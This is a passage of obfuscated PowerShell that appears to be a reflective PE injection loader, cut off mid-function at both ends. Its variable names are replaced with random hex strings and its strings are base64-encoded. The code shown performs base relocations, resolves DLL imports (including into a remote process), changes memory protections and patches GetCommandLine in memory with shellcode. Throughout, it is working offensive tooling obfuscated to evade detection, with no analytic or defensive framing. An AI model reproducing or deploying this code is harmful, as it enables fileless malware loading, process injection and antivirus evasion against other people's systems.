				Test-MemoryRangeValid -ad0937a6b5514403a124ef387e801a35 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -cf3b0c7ec8154434be540fb42c7d8bc2 ${cf3b0c7ec8154434be540fb42c7d8bc2} -ec6af79a1f4140bf9022e4a98471da5e ${be1ba584fe1b4e44bcea9d7c3f672814} | Out-Null
				${e68f649120fc4868841a2d8eea9e08f5}.memset.Invoke(${cf3b0c7ec8154434be540fb42c7d8bc2}, 0, [IntPtr]${be1ba584fe1b4e44bcea9d7c3f672814}) | Out-Null
			}
		}
	}
	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${bbcbfc25b29142cebda6a3ecf7dde05f},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239}
		)
		[Int64]${864dd1da378c411ba06b24b44549ef50} = 0
		${46c5e4b4ea1e4401846b36aa564ab8ec} = $true 
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_BASE_RELOCATION)
		if ((${bbcbfc25b29142cebda6a3ecf7dde05f} -eq [Int64]${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle) `
				-or (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt (${bbcbfc25b29142cebda6a3ecf7dde05f}) (${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle)) -eq $true)
		{
			${864dd1da378c411ba06b24b44549ef50} = Sub-SignedIntAsUnsigned (${bbcbfc25b29142cebda6a3ecf7dde05f}) (${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle)
			${46c5e4b4ea1e4401846b36aa564ab8ec} = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt (${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle) (${bbcbfc25b29142cebda6a3ecf7dde05f})) -eq $true)
		{
			${864dd1da378c411ba06b24b44549ef50} = Sub-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle) (${bbcbfc25b29142cebda6a3ecf7dde05f})
		}
		[IntPtr]${7e6eafccbfcf444a896081001fadc597} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${bfa63a4ddf384bcc8ea200cbab45000a} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${7e6eafccbfcf444a896081001fadc597}, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_BASE_RELOCATION)
			if (${bfa63a4ddf384bcc8ea200cbab45000a}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${bfa63a4ddf384bcc8ea200cbab45000a}.VirtualAddress))
			${cc0fee02b07740c8ac78c9d309a63dcb} = (${bfa63a4ddf384bcc8ea200cbab45000a}.SizeOfBlock - $ImageBaseRelocSize) / 2
			for(${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt ${cc0fee02b07740c8ac78c9d309a63dcb}; ${9282212b31e84e3ca7221e3fcd69f077}++)
			{
				${539fc573397a4d21af5dcd29e00d25c3} = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]${7e6eafccbfcf444a896081001fadc597}) ([Int64]$ImageBaseRelocSize + (2 * ${9282212b31e84e3ca7221e3fcd69f077})))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${539fc573397a4d21af5dcd29e00d25c3}, [Type][UInt16])
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]${b0db34007c2f4a41921d16aa72ea1d41} = $RelocationInfo -band 0xF000
				for (${ce3decd504ad44a5aa166956620b836e} = 0; ${ce3decd504ad44a5aa166956620b836e} -lt 12; ${ce3decd504ad44a5aa166956620b836e}++)
				{
					${b0db34007c2f4a41921d16aa72ea1d41} = [Math]::Floor(${b0db34007c2f4a41921d16aa72ea1d41} / 2)
				}
				if ((${b0db34007c2f4a41921d16aa72ea1d41} -eq ${a851be47767a4e43b58c4498cda85d23}.IMAGE_REL_BASED_HIGHLOW) `
						-or (${b0db34007c2f4a41921d16aa72ea1d41} -eq ${a851be47767a4e43b58c4498cda85d23}.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
					if (${46c5e4b4ea1e4401846b36aa564ab8ec} -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) (${864dd1da378c411ba06b24b44549ef50}))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) (${864dd1da378c411ba06b24b44549ef50}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif (${b0db34007c2f4a41921d16aa72ea1d41} -ne ${a851be47767a4e43b58c4498cda85d23}.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: ${b0db34007c2f4a41921d16aa72ea1d41}, relocationinfo: $RelocationInfo"
				}
			}
			${7e6eafccbfcf444a896081001fadc597} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${7e6eafccbfcf444a896081001fadc597}) ([Int64]${bfa63a4ddf384bcc8ea200cbab45000a}.SizeOfBlock))
		}
	}
	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23},
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${dbc8e071ba554a5991d5c23be7628337}
		)
		${f229a27ea82c4771b75975fc5836337f} = $false
		if (${a6f1c45867c645738edd3413cf0d7718}.PEHandle -ne ${a6f1c45867c645738edd3413cf0d7718}.EffectivePEHandle)
		{
			${f229a27ea82c4771b75975fc5836337f} = $true
		}
		if (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${8eae317484b149a1b2b2b28c8691917c} = Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${ca5a2326b79d43a3b81e5bab8a1c9536} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${8eae317484b149a1b2b2b28c8691917c}, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_IMPORT_DESCRIPTOR)
				if (${ca5a2326b79d43a3b81e5bab8a1c9536}.Characteristics -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.FirstThunk -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.ForwarderChain -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.Name -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${2c3440b301eb4e4d8f9459b6020a0435} = [IntPtr]::Zero
				${bf4870283e054bd5833aafc59cdaeed1} = (Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${ca5a2326b79d43a3b81e5bab8a1c9536}.Name))
				${7e24bc57bb2942989bb237b7e87a010f} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${bf4870283e054bd5833aafc59cdaeed1})
				if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
				{
					${2c3440b301eb4e4d8f9459b6020a0435} = Import-DllInRemoteProcess -dbc8e071ba554a5991d5c23be7628337 ${dbc8e071ba554a5991d5c23be7628337} -bf4870283e054bd5833aafc59cdaeed1 ${bf4870283e054bd5833aafc59cdaeed1}
				}
				else
				{
					${2c3440b301eb4e4d8f9459b6020a0435} = ${e68f649120fc4868841a2d8eea9e08f5}.LoadLibrary.Invoke(${7e24bc57bb2942989bb237b7e87a010f})
				}
				if ((${2c3440b301eb4e4d8f9459b6020a0435} -eq $null) -or (${2c3440b301eb4e4d8f9459b6020a0435} -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: ${7e24bc57bb2942989bb237b7e87a010f}"
				}
				[IntPtr]${aae69502ae994f439cd057887f400a04} = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${ca5a2326b79d43a3b81e5bab8a1c9536}.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${ca5a2326b79d43a3b81e5bab8a1c9536}.Characteristics) 
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    ${b509d239898c49579585d7368c4a3e61} = $false
                    [IntPtr]${ea84d2b5a9514a50a0c6f65b362db7c3} = [IntPtr]::Zero
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]${ea84d2b5a9514a50a0c6f65b362db7c3} = [IntPtr]$OriginalThunkRefVal -band 0xffff 
                        ${b509d239898c49579585d7368c4a3e61} = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]${ea84d2b5a9514a50a0c6f65b362db7c3} = [Int64]$OriginalThunkRefVal -band 0xffff 
                        ${b509d239898c49579585d7368c4a3e61} = $true
					}
					else
					{
						[IntPtr]${b3c9b73a1e8644808fb19c43f33f2648} = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ($OriginalThunkRefVal)
						${b3c9b73a1e8644808fb19c43f33f2648} = Add-SignedIntAsUnsigned ${b3c9b73a1e8644808fb19c43f33f2648} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${5d88445861c64c8ea581751c69e4187d} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${b3c9b73a1e8644808fb19c43f33f2648})
                        ${ea84d2b5a9514a50a0c6f65b362db7c3} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${5d88445861c64c8ea581751c69e4187d})
					}
					if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -dbc8e071ba554a5991d5c23be7628337 ${dbc8e071ba554a5991d5c23be7628337} -b4c822cc06214edb95f95e74dd00cbf7 ${2c3440b301eb4e4d8f9459b6020a0435} -a4dcea6ae1694304a1b182f1261fe706 ${ea84d2b5a9514a50a0c6f65b362db7c3} -b509d239898c49579585d7368c4a3e61 ${b509d239898c49579585d7368c4a3e61}
					}
					else
					{
				        [IntPtr]$NewThunkRef = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddressIntPtr.Invoke(${2c3440b301eb4e4d8f9459b6020a0435}, ${ea84d2b5a9514a50a0c6f65b362db7c3})
					}
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if (${b509d239898c49579585d7368c4a3e61})
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: ${ea84d2b5a9514a50a0c6f65b362db7c3}. Dll: ${7e24bc57bb2942989bb237b7e87a010f}"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: ${5d88445861c64c8ea581751c69e4187d}. Dll: ${7e24bc57bb2942989bb237b7e87a010f}"
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, ${aae69502ae994f439cd057887f400a04}, $false)
					${aae69502ae994f439cd057887f400a04} = Add-SignedIntAsUnsigned ([Int64]${aae69502ae994f439cd057887f400a04}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                    if ((-not ${b509d239898c49579585d7368c4a3e61}) -and (${ea84d2b5a9514a50a0c6f65b362db7c3} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${ea84d2b5a9514a50a0c6f65b362db7c3})
                        ${ea84d2b5a9514a50a0c6f65b362db7c3} = [IntPtr]::Zero
                    }
				}
				${8eae317484b149a1b2b2b28c8691917c} = Add-SignedIntAsUnsigned (${8eae317484b149a1b2b2b28c8691917c}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${e2c0dd6c815d4349b3390c6b8c804a7e}
		)
		${3ea6af68505442878f1c3785eab9c19f} = 0x0
		if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_READWRITE
				}
				else
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_READONLY
				}
			}
			else
			{
				if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_WRITECOPY
				}
				else
				{
					${3ea6af68505442878f1c3785eab9c19f} = ${a851be47767a4e43b58c4498cda85d23}.PAGE_NOACCESS
				}
			}
		}
		if ((${e2c0dd6c815d4349b3390c6b8c804a7e} -band ${a851be47767a4e43b58c4498cda85d23}.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${3ea6af68505442878f1c3785eab9c19f} = ${3ea6af68505442878f1c3785eab9c19f} -bor ${a851be47767a4e43b58c4498cda85d23}.PAGE_NOCACHE
		}
		return ${3ea6af68505442878f1c3785eab9c19f}
	}
	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23},
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		${e39002e42e324234be4b9268daddc239}
		)
		for( ${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt ${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${9282212b31e84e3ca7221e3fcd69f077}++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.SectionHeaderPtr) (${9282212b31e84e3ca7221e3fcd69f077} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_SECTION_HEADER)))
			${6f0023c5723b446398a76b7e0d1380cb} = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${6f0023c5723b446398a76b7e0d1380cb}.VirtualAddress)
			[UInt32]$ProtectFlag = Get-VirtualProtectValue ${6f0023c5723b446398a76b7e0d1380cb}.Characteristics
			[UInt32]$SectionSize = ${6f0023c5723b446398a76b7e0d1380cb}.VirtualSize
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -ad0937a6b5514403a124ef387e801a35 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -cf3b0c7ec8154434be540fb42c7d8bc2 $SectionPtr -ec6af79a1f4140bf9022e4a98471da5e $SectionSize | Out-Null
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${a6f1c45867c645738edd3413cf0d7718},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${e68f649120fc4868841a2d8eea9e08f5},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${a851be47767a4e43b58c4498cda85d23},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${e9d488658e5045cdb725ead7e42bcfa8},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${a58ef014534245c991e74b19306d6cb3}
		)
		${ebd86bbbfe5c487495a61c9f406547aa} = @() 
		${316b88f6ef8c400aac88c3cceb745ea2} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		[IntPtr]${81f04b18eb70444ab2797c3a533e47a1} = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${81f04b18eb70444ab2797c3a533e47a1} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]$KernelBaseHandle = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${009ffbe24d11486eb804f865dafd7645} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${e9d488658e5045cdb725ead7e42bcfa8})
		${80e5a1ca060d4de6abf7ec2177fb9c27} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${e9d488658e5045cdb725ead7e42bcfa8})
		[IntPtr]$GetCommandLineAAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke($KernelBaseHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]$GetCommandLineWAddr = ${e68f649120fc4868841a2d8eea9e08f5}.GetProcAddress.Invoke($KernelBaseHandle, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}
		[Byte[]]$Shellcode1 = @()
		if (${316b88f6ef8c400aac88c3cceb745ea2} -eq 8)
		{
			$Shellcode1 += 0x48	
		}
		$Shellcode1 += 0xb8
		[Byte[]]$Shellcode2 = @(0xc3)
		${71d351e968b84b0682d5a96461c6f7d1} = $Shellcode1.Length + ${316b88f6ef8c400aac88c3cceb745ea2} + $Shellcode2.Length
		${9582bece8c164077895b405623c905eb} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${71d351e968b84b0682d5a96461c6f7d1})
		${37e6fecf33744064b290d23c14cddea4} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${71d351e968b84b0682d5a96461c6f7d1})
		${e68f649120fc4868841a2d8eea9e08f5}.memcpy.Invoke(${9582bece8c164077895b405623c905eb}, $GetCommandLineAAddr, [UInt64]${71d351e968b84b0682d5a96461c6f7d1}) | Out-Null
		${e68f649120fc4868841a2d8eea9e08f5}.memcpy.Invoke(${37e6fecf33744064b290d23c14cddea4}, $GetCommandLineWAddr, [UInt64]${71d351e968b84b0682d5a96461c6f7d1}) | Out-Null
		${ebd86bbbfe5c487495a61c9f406547aa} += ,($GetCommandLineAAddr, ${9582bece8c164077895b405623c905eb}, ${71d351e968b84b0682d5a96461c6f7d1})
		${ebd86bbbfe5c487495a61c9f406547aa} += ,($GetCommandLineWAddr, ${37e6fecf33744064b290d23c14cddea4}, ${71d351e968b84b0682d5a96461c6f7d1})
		[UInt32]$OldProtectFlag = 0
		${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32](${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if (${bfd6b4588cf14a19b91ca177e24a9fe3} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${5a0ff723c51b4c7098ff17d096e87c54} = $GetCommandLineAAddr
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode1 -ed8e2beac355444db175543089c05e66 ${5a0ff723c51b4c7098ff17d096e87c54}
		${5a0ff723c51b4c7098ff17d096e87c54} = Add-SignedIntAsUnsigned ${5a0ff723c51b4c7098ff17d096e87c54} ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${80e5a1ca060d4de6abf7ec2177fb9c27}, ${5a0ff723c51b4c7098ff17d096e87c54}, $false)
		${5a0ff723c51b4c7098ff17d096e87c54} = Add-SignedIntAsUnsigned ${5a0ff723c51b4c7098ff17d096e87c54} ${316b88f6ef8c400aac88c3cceb745ea2}
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode2 -ed8e2beac355444db175543089c05e66 ${5a0ff723c51b4c7098ff17d096e87c54}
		${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		[UInt32]$OldProtectFlag = 0
		${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32](${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if (${bfd6b4588cf14a19b91ca177e24a9fe3} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${50c094550e4647ad8afe865e27cf6b85} = $GetCommandLineWAddr
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode1 -ed8e2beac355444db175543089c05e66 ${50c094550e4647ad8afe865e27cf6b85}
		${50c094550e4647ad8afe865e27cf6b85} = Add-SignedIntAsUnsigned ${50c094550e4647ad8afe865e27cf6b85} ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${009ffbe24d11486eb804f865dafd7645}, ${50c094550e4647ad8afe865e27cf6b85}, $false)
		${50c094550e4647ad8afe865e27cf6b85} = Add-SignedIntAsUnsigned ${50c094550e4647ad8afe865e27cf6b85} ${316b88f6ef8c400aac88c3cceb745ea2}
		Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 $Shellcode2 -ed8e2beac355444db175543089c05e66 ${50c094550e4647ad8afe865e27cf6b85}
		${e68f649120fc4868841a2d8eea9e08f5}.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]${71d351e968b84b0682d5a96461c6f7d1}, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		${7189cf6382ca40ecb50c4c33384b7cbf} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
